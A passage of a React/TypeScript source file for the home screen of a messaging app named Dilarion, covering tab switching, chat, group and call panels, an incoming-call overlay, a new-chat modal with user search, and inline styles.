                        {g.member_count} members
                      </span>
                    </div>
                  </button>
                );
              })
            )}
          </div>
        </>
      );
    }

    if (activeTab === 'calls') {
      return (
        <CallsList
          calls={calls}
          loading={loadingCalls}
          selectedCallId={selectedCallId}
          onSelectCall={setSelectedCallId}
        />
      );
    }

    if (activeTab === 'settings') {
      return <SettingsListPanel />;
    }

    return null;
  }

  // ── Main Panel content ───────────────────────────────────────────────────────

  function renderMainContent() {
    if (activeTab === 'chats') {
      if (selectedChat) {
        const partnerContact = contacts.find(c => c.username === selectedChat);
        return (
          <ChatPanel
            token={token}
            myUsername={username}
            partner={selectedChat}
            partnerOnline={partnerContact?.is_active ?? false}
            masterToken={masterToken}
            onMasterTokenSaved={setMasterToken}
            onCall={handleCall}
          />
        );
      }
      return (
        <WelcomePlaceholder title="Dilarion" subtitle="Select a contact to start chatting">
          <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="#4b5563" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round">
            <path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z" />
          </svg>
        </WelcomePlaceholder>
      );
    }

    if (activeTab === 'groups') {
      if (selectedGroup !== null) {
        const group = groups.find(g => g.id === selectedGroup);
        if (group) {
          return (
            <GroupPanel
              token={token}
              myUsername={username}
              group={group}
              masterToken={masterToken}
              onMasterTokenSaved={setMasterToken}
            />
          );
        }
      }
      return (
        <WelcomePlaceholder title="Groups" subtitle="Select a group to view messages">
          <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="#4b5563" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round">
            <path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2" />
            <circle cx="9" cy="7" r="4" />
            <path d="M23 21v-2a4 4 0 0 0-3-3.87" />
            <path d="M16 3.13a4 4 0 0 1 0 7.75" />
          </svg>
        </WelcomePlaceholder>
      );
    }

    if (activeTab === 'calls') {
      const selectedCall = calls.find(c => c.id === selectedCallId) ?? null;
      return <CallDetailPanel call={selectedCall} />;
    }

    if (activeTab === 'settings') {
      return (
        <SettingsMainPanel
          token={token}
          username={username}
          masterToken={masterToken}
          onSetMasterToken={setMasterToken}
          onClearMasterToken={() => setMasterToken(null)}
          onLogout={onLogout}
        />
      );
    }

    return null;
  }

  // ── Render ───────────────────────────────────────────────────────────────────

  return (
    <div style={hs.root}>

      {/* ── TAB BAR (72px) ─────────────────────────────────────────────── */}
      <nav style={hs.tabBar}>
        <button
          style={{ ...hs.tabBtn, ...(activeTab === 'chats' ? hs.tabBtnActive : {}) }}
          onClick={() => switchTab('chats')}
          title="Chats"
        >
          <ChatTabIcon active={activeTab === 'chats'} />
        </button>
        <button
          style={{ ...hs.tabBtn, ...(activeTab === 'groups' ? hs.tabBtnActive : {}) }}
          onClick={() => switchTab('groups')}
          title="Groups"
        >
          <GroupTabIcon active={activeTab === 'groups'} />
        </button>
        <button
          style={{ ...hs.tabBtn, ...(activeTab === 'calls' ? hs.tabBtnActive : {}) }}
          onClick={() => switchTab('calls')}
          title="Calls"
        >
          <CallTabIcon active={activeTab === 'calls'} />
        </button>

        {/* Settings pinned to bottom */}
        <button
          style={{ ...hs.tabBtn, ...(activeTab === 'settings' ? hs.tabBtnActive : {}), marginTop: 'auto' }}
          onClick={() => switchTab('settings')}
          title="Settings"
        >
          <SettingsTabIcon active={activeTab === 'settings'} />
        </button>
      </nav>

      {/* ── LIST PANEL (320px) ──────────────────────────────────────────── */}
      <aside style={hs.listPanel}>
        {renderListHeader()}
        {renderListContent()}
      </aside>

      {/* ── MAIN PANEL (flex 1) ─────────────────────────────────────────── */}
      <main style={hs.mainPanel}>
        {renderMainContent()}
      </main>

      {/* ── CALL MODAL ──────────────────────────────────────────────────── */}
      {activeCall && (
        <CallModal
          token={token}
          myUsername={username}
          partner={activeCall.partner}
          callType={activeCall.callType}
          isIncoming={activeCall.isIncoming}
          onEnd={() => setActiveCall(null)}
        />
      )}

      {/* ── INCOMING CALL OVERLAY ────────────────────────────────────────── */}
      {incomingCall && !activeCall && (
        <div style={{
          position: 'fixed', inset: 0, zIndex: 900,
          display: 'flex', alignItems: 'flex-end', justifyContent: 'flex-end',
          padding: 24, pointerEvents: 'none',
        }}>
          <div style={{
            background: '#1a1a1a',
            border: '1px solid #2a2a2a',
            borderRadius: 16,
            padding: '20px 24px',
            display: 'flex',
            flexDirection: 'column',
            gap: 14,
            minWidth: 280,
            boxShadow: '0 20px 60px rgba(0,0,0,0.8)',
            pointerEvents: 'all',
          }}>
            <div style={{ display: 'flex', alignItems: 'center', gap: 12 }}>
              <div style={{
                width: 46, height: 46, borderRadius: '50%',
                background: '#2a2a2a', color: '#d1d5db',
                display: 'flex', alignItems: 'center', justifyContent: 'center',
                fontWeight: 700, fontSize: '0.9rem', flexShrink: 0,
              }}>
                {initials(incomingCall.from)}
              </div>
              <div>
                <div style={{ fontSize: '0.95rem', fontWeight: 700, color: '#f1f5f9' }}>{incomingCall.from}</div>
                <div style={{ fontSize: '0.78rem', color: '#9ca3af', marginTop: 2 }}>
                  Incoming {incomingCall.callType} call…
                </div>
              </div>
            </div>
            <div style={{ display: 'flex', gap: 10 }}>
              <button
                onClick={() => setIncomingCall(null)}
                style={{
                  flex: 1, background: '#ef4444', border: 'none', borderRadius: 10,
                  color: '#fff', fontWeight: 700, fontSize: '0.85rem',
                  padding: '10px 0', cursor: 'pointer',
                }}
              >
                Decline
              </button>
              <button
                onClick={() => {
                  setActiveCall({ partner: incomingCall.from, callType: incomingCall.callType, isIncoming: true });
                  setIncomingCall(null);
                }}
                style={{
                  flex: 1, background: '#25d366', border: 'none', borderRadius: 10,
                  color: '#fff', fontWeight: 700, fontSize: '0.85rem',
                  padding: '10px 0', cursor: 'pointer',
                }}
              >
                Accept
              </button>
            </div>
          </div>
        </div>
      )}

      {/* ── NEW CHAT MODAL ───────────────────────────────────────────────── */}
      {showNewChat && (
        <div
          style={{
            position: 'fixed', inset: 0, zIndex: 800,
            background: 'rgba(0,0,0,0.7)',
            display: 'flex', alignItems: 'center', justifyContent: 'center',
          }}
          onClick={e => { if (e.target === e.currentTarget) { setShowNewChat(false); setUserSearch(''); } }}
        >
          <div style={{
            background: '#111',
            border: '1px solid #2a2a2a',
            borderRadius: 16,
            width: 380,
            maxHeight: '70vh',
            display: 'flex',
            flexDirection: 'column',
            overflow: 'hidden',
            boxShadow: '0 24px 80px rgba(0,0,0,0.8)',
          }}>
            {/* Header */}
            <div style={{
              display: 'flex', alignItems: 'center', justifyContent: 'space-between',
              padding: '16px 20px', borderBottom: '1px solid #1e1e1e', flexShrink: 0,
            }}>
              <span style={{ fontWeight: 800, fontSize: '1rem', color: '#f1f5f9' }}>New Chat</span>
              <button
                onClick={() => { setShowNewChat(false); setUserSearch(''); }}
                style={{ background: 'transparent', border: 'none', cursor: 'pointer', color: '#6b7280', fontSize: '1.1rem', lineHeight: 1 }}
              >✕</button>
            </div>
            {/* Search */}
            <div style={{
              display: 'flex', alignItems: 'center', gap: 8,
              margin: '10px 12px', background: '#1a1a1a',
              border: '1px solid #222', borderRadius: 10, padding: '8px 12px', flexShrink: 0,
            }}>
              <SearchIconSvg />
              <input
                autoFocus
                style={{ flex: 1, background: 'transparent', border: 'none', color: '#d1d5db', fontSize: '0.85rem' }}
                placeholder="Search users"
                value={userSearch}
                onChange={e => setUserSearch(e.target.value)}
              />
            </div>
            {/* User list */}
            <div style={{ flex: 1, overflowY: 'auto' }}>
              {loadingUsers ? (
                <ContactSkeleton />
              ) : (
                allUsers
                  .filter(u => u.username.toLowerCase().includes(userSearch.toLowerCase()))
                  .map(u => (
                    <button
                      key={u.username}
                      style={{ ...hs.listItem }}
                      onClick={() => startChatWith(u.username)}
                    >
                      <div style={{ position: 'relative', flexShrink: 0 }}>
                        <div style={hs.contactAvatar}>{initials(u.username)}</div>
                        <div style={{
                          position: 'absolute', bottom: 1, right: 1,
                          width: 11, height: 11, borderRadius: '50%',
                          background: u.is_active ? '#25d366' : '#374151',
                          border: '2px solid #111',
                        }} />
                      </div>
                      <div style={hs.itemInfo}>
                        <span style={hs.itemName}>{u.username}</span>
                        <span style={{ fontSize: '0.72rem', color: u.is_active ? '#25d366' : '#6b7280' }}>
                          {u.is_active ? 'online' : 'offline'}
                        </span>
                      </div>
                    </button>
                  ))
              )}
              {!loadingUsers && allUsers.filter(u => u.username.toLowerCase().includes(userSearch.toLowerCase())).length === 0 && (
                <div style={hs.emptyList}>{userSearch ? 'No users found' : 'No other users'}</div>
              )}
            </div>
          </div>
        </div>
      )}

    </div>
  );
}

// ── Search icon ────────────────────────────────────────────────────────────────

function SearchIconSvg() {
  return (
    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#6b7280" strokeWidth="2" strokeLinecap="round" style={{ flexShrink: 0 }}>
      <circle cx="11" cy="11" r="8" />
      <line x1="21" y1="21" x2="16.65" y2="16.65" />
    </svg>
  );
}

// ── Styles ─────────────────────────────────────────────────────────────────────

const hs: Record<string, React.CSSProperties> = {
  root: {
    display: 'flex',
    flexDirection: 'row',
    height: '100vh',
    background: '#0c0c0c',
    overflow: 'hidden',
  },

  // Tab bar
  tabBar: {
    width: 72,
    minWidth: 72,
    flexShrink: 0,
    display: 'flex',
    flexDirection: 'column',
    alignItems: 'center',
    paddingTop: 16,
    paddingBottom: 16,
    gap: 4,
    background: '#0d0d0d',
    borderRight: '1px solid #1a1a1a',
  },
  tabBtn: {
    width: 44,
    height: 44,
    borderRadius: 12,
    display: 'flex',
    alignItems: 'center',
    justifyContent: 'center',
    background: 'transparent',
    border: 'none',
    cursor: 'pointer',
    transition: 'background 0.12s',
    color: '#4b5563',
    flexShrink: 0,
  },
  tabBtnActive: {
    background: '#1a0d0d',
  },

  // List panel
  listPanel: {
    width: 320,
    minWidth: 220,
    maxWidth: 360,
    flexShrink: 0,
    display: 'flex',
    flexDirection: 'column',
    background: '#111',
    borderRight: '1px solid #1e1e1e',
    overflow: 'hidden',
  },
  listHeader: {
    display: 'flex',
    alignItems: 'center',
    justifyContent: 'space-between',
    padding: '16px 20px 10px',
    flexShrink: 0,
  },
  listHeaderTitle: {
    fontSize: '1.1rem',
    fontWeight: 800,
    color: '#f1f5f9',
    letterSpacing: '-0.03em',
  },
  searchWrap: {
    display: 'flex',
    alignItems: 'center',
    gap: 8,
    margin: '4px 12px 8px',
    background: '#1a1a1a',
    border: '1px solid #222',
    borderRadius: 10,
    padding: '8px 12px',
    flexShrink: 0,
  },
  searchInput: {
    flex: 1,
    background: 'transparent',
    border: 'none',
    color: '#d1d5db',
    fontSize: '0.85rem',
  },
  listItems: {
    flex: 1,
    overflowY: 'auto',
  },
  emptyList: {
    padding: '24px 16px',
    textAlign: 'center',
    color: '#4b5563',
    fontSize: '0.82rem',
  },
  listItem: {
    display: 'flex',
    alignItems: 'center',
    gap: 12,
    width: '100%',
    padding: '10px 16px',
    textAlign: 'left',
    cursor: 'pointer',
    transition: 'background 0.12s',
    border: 'none',
    fontFamily: 'inherit',
    background: 'transparent',
  },
  contactAvatar: {
    width: 46,
    height: 46,
    borderRadius: '50%',
    background: '#2a2a2a',
    color: '#d1d5db',
    display: 'flex',
    alignItems: 'center',
    justifyContent: 'center',
    fontWeight: 700,
    fontSize: '0.82rem',
    flexShrink: 0,
  },
  groupAvatar: {
    width: 46,
    height: 46,
    borderRadius: '50%',
    color: '#fff',
    display: 'flex',
    alignItems: 'center',
    justifyContent: 'center',
    fontWeight: 700,
    fontSize: '0.82rem',
    flexShrink: 0,
  },
  itemInfo: {
    flex: 1,
    display: 'flex',
    flexDirection: 'column',
    gap: 3,
    minWidth: 0,
  },
  itemName: {
    fontSize: '0.88rem',
    fontWeight: 600,
    color: '#e5e7eb',
    overflow: 'hidden',
    textOverflow: 'ellipsis',
    whiteSpace: 'nowrap',
  },
  unreadBadge: {
    background: '#c0392b',
    color: '#fff',
    fontSize: '0.65rem',
    fontWeight: 700,
    borderRadius: 10,
    padding: '1px 7px',
    minWidth: 20,
    textAlign: 'center',
    flexShrink: 0,
  },

  // Main panel
  mainPanel: {
    flex: 1,
    display: 'flex',
    flexDirection: 'column',
    overflow: 'hidden',
    background: '#0e0e0e',
  },
};
